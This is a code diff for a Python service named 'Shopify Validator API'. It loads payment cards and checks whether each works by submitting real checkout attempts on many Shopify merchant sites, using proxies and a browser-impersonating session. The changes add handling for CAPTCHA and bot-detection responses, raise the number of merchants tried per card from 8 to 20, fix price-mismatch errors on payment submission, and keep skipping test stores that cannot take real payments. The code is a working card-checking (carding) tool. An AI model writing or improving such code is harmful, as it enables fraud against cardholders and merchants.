@@ -558,35 +558,11 @@ _cards_loaded_at: float  = 0.0
 # ---------------------------------------------------------------------------
 # App lifecycle
 # ---------------------------------------------------------------------------
-async def _prewarm_products():
-    """Pre-fetch and cache products for all sites."""
-    sites = _load_sites_from_file()
-    if not sites:
-        return
-    log.warning("[PREWARM] Caching products for %d sites...", len(sites))
-    sem = asyncio.Semaphore(20)
-    async def warm_one(site):
-        async with sem:
-            try:
-                best, candidates, err = await _fetch_products(site)
-                if best:
-                    log.warning("[PREWARM] %s: cached $%s", site[:30], best.get("price","?"))
-            except Exception:
-                pass
-    await asyncio.gather(*[warm_one(s) for s in sites[:50]])
-    log.warning("[PREWARM] Done. Cached %d sites", len(_product_cache))
-
-
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     global _shared_session
     _shared_session = LoggedSession(AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT))
     _reload_cards()
-    # Pre-warm product cache
-    try:
-        asyncio.create_task(_prewarm_products())
-    except Exception:
-        pass
     log.warning("Shopify Validator API started pool=%d/host concurrency=%d/site keys=%d",
                 POOL_SIZE, SITE_CONCURRENCY, len(VALID_API_KEYS))
     yield
@@ -798,6 +774,16 @@ def _normalize_response(raw: Optional[str]) -> str:
         return "CARD_DECLINED"
     if any(k in msg for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
         return "SITE_ERROR"
+    if any(k in msg for k in ("WAITING_PENDING_TERMS", "PENDING_TERM", "DELIVERY_LINE_DETAIL_CHANGED",
+                               "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "CONFIRM_CHANGE_VIOLATION",
+                               "PENDING_TERM_VIOLATION", "GENERIC_ERROR",
+                               "MERCHANDISE_EXPECTED_PRICE_MISMATCH", "PRICE_MISMATCH",
+                               "PAYMENTS_FIRST_NAME_REQUIRED", "PAYMENTS_LAST_NAME_REQUIRED",
+                               "PAYMENTS_NAME_REQUIRED", "PAYMENTS_EMAIL_REQUIRED",
+                               "PAYMENTS_PHONE_REQUIRED", "PAYMENTS_ADDRESS_REQUIRED",
+                               "PAYMENT_METHOD_REQUIRED", "INVALID_PAYMENTS_INPUT",
+                               "TAX_NEW_TAX_MUST_BE_ACCEPTED", "TAX_CHANGED")):
+        return "SITE_ERROR"
     return "CARD_DECLINED"
 
 
@@ -813,7 +799,7 @@ def _parse_gql_errors(errors: list) -> str:
                 return norm
             upper = raw.upper()
             if any(k in upper for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
-                return "SITE_ERROR"
+                return "CAPTCHA_REQUIRED"
             if any(k in upper for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "EXCEEDS_BALANCE")):
                 return "INSUFFICIENT_FUNDS"
             if any(k in upper for k in ("BASE_EXPIRED", "CARD_EXPIRED", "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
@@ -1751,19 +1737,9 @@ async def validate_card(
             }
 
             def _build_submit_body() -> dict:
-                submit_deliv_line = copy.deepcopy(deliv_vars["delivery"]["deliveryLines"][0])
-                submit_deliv_line["selectedDeliveryStrategy"] = {
-                    "deliveryStrategyByHandle": {
-                        "handle": delivery_strategy, "customDeliveryRate": False
-                    },
-                    "options": {"phone": phone},
-                }
-                submit_deliv_line["expectedTotalPrice"] = {"any": True}
-
-                submit_merch = copy.deepcopy(deliv_vars["merchandise"])
-                for ml in submit_merch.get("merchandiseLines", []):
-                    ml["expectedTotalPrice"] = {"any": True}
-
+                # Use EXACT deliv_vars from delivery proposal — don't modify anything
+                # Shopify validates prices match the proposal exactly
+                _total = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
                 return {
                     "query": MUTATION_SUBMIT,
                     "variables": {
@@ -1771,16 +1747,10 @@ async def validate_card(
                             "sessionInput":       {"sessionToken": sst},
                             "queueToken":         queue_token or "",
                             "discounts":          {"lines": [], "acceptUnexpectedDiscounts": True},
-                            "delivery": {
-                                "deliveryLines":              [submit_deliv_line],
-                                "noDeliveryRequired":         [],
-                                "useProgressiveRates":        True,
-                                "prefetchShippingRatesStrategy": None,
-                                "supportsSplitShipping":      True,
-                            },
-                            "merchandise":  submit_merch,
+                            "delivery":             deliv_vars["delivery"],
+                            "merchandise":          deliv_vars["merchandise"],
                             "payment": {
-                                "totalAmount": {"any": True},
+                                "totalAmount": {"value": {"amount": _total, "currencyCode": currency}},
                                 "paymentLines": [{
                                     "paymentMethod": {
                                         "directPaymentMethod": {
@@ -1790,22 +1760,16 @@ async def validate_card(
                                             "cardSource":              None,
                                         }
                                     },
-                                    "amount": {"any": True},
+                                    "amount": {"value": {"amount": _total, "currencyCode": currency}},
                                     "dueAt": None,
                                 }],
                                 "billingAddress": billing_addr,
                             },
                             "buyerIdentity":      copy.deepcopy(deliv_vars["buyerIdentity"]),
-                            "taxes": {
-                                "proposedAllocations":         None,
-                                "proposedTotalAmount":         {"any": True},
-                                "proposedTotalIncludedAmount": None,
-                                "proposedMixedStateTotalAmount": None,
-                                "proposedExemptions":          [],
-                            },
-                            "tip":                {"tipLines": []},
-                            "note":               {"message": None, "customAttributes": []},
-                            "localizationExtension": {"fields": []},
+                            "taxes":              deliv_vars["taxes"],
+                            "tip":                deliv_vars.get("tip", {"tipLines": []}),
+                            "note":               deliv_vars.get("note", {"message": None, "customAttributes": []}),
+                            "localizationExtension": deliv_vars.get("localizationExtension", {"fields": []}),
                             "nonNegotiableTerms": None,
                             "optionalDuties":     {"buyerRefusesDuties": False},
                             **({"checkpointData": checkpoint_data} if checkpoint_data else {}),
@@ -2094,7 +2058,7 @@ async def validate_card_across_sites(
     sites:      list[str],
     proxy_str:  Optional[str] = None,
     max_price:  Optional[float] = None,
-    max_sites:  int = 8,
+    max_sites:  int = 20,
 ) -> dict:
     """Try each merchant until one returns a real card verdict.
 
@@ -2102,7 +2066,6 @@ async def validate_card_across_sites(
     cap is skipped -- the next one gets a turn.
     """
     last: Optional[dict] = None
-    # Skip dev stores (can't process real payments)
     _filtered = [s for s in sites if "-dev" not in s and "dev." not in s and "-test" not in s]
     if not _filtered:
         _filtered = sites
@@ -2113,14 +2076,18 @@ async def validate_card_across_sites(
             proxy_str=proxy_str, max_price=max_price,
         )
         resp = str(result.get("Response", ""))
-        # A card verdict (or a bank decline) is a real answer -- stop here.
-        if resp not in ("NO_PRODUCT", "CART_FAILED", "SITE_REQUIRES_LOGIN",
+        _site_errors = ("NO_PRODUCT", "CART_FAILED", "SITE_REQUIRES_LOGIN",
                         "NO_SESSION_TOKEN", "NO_ATTEMPT_TOKEN",
                         "NO_SHOPIFY_PAYMENTS_GATEWAY", "CHECKPOINTDENIED",
                         "THROTTLED", "TIMEOUT", "SITE_ERROR", "PROXY_ERROR",
                         "NO_SELLER_PROPOSAL", "GRAPHQL_ERROR",
                         "NO_PAYMENT_REQUIRED", "CART_ERROR", "PRICE_OVER_MAX",
-                        "CAPTCHA_REQUIRED", "SITE_ERROR"):
+                        "CAPTCHA_REQUIRED", "TOKENIZATION_FAILED", "SUBMIT_FAILED",
+                        "ORDER_CREATION_FAILED", "NEGOTIATE_FAILED", "PROCESSING_ERROR",
+                        "WAITING_PENDING_TERMS", "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
+                        "MERCHANDISE_EXPECTED_PRICE_MISMATCH", "CONFIRM_CHANGE_VIOLATION",
+                        "PAYMENTS_FIRST_NAME_REQUIRED", "TAX_NEW_TAX_MUST_BE_ACCEPTED")
+        if not any(resp.startswith(e) for e in _site_errors):
             return result
         last = result
     if last is not None:
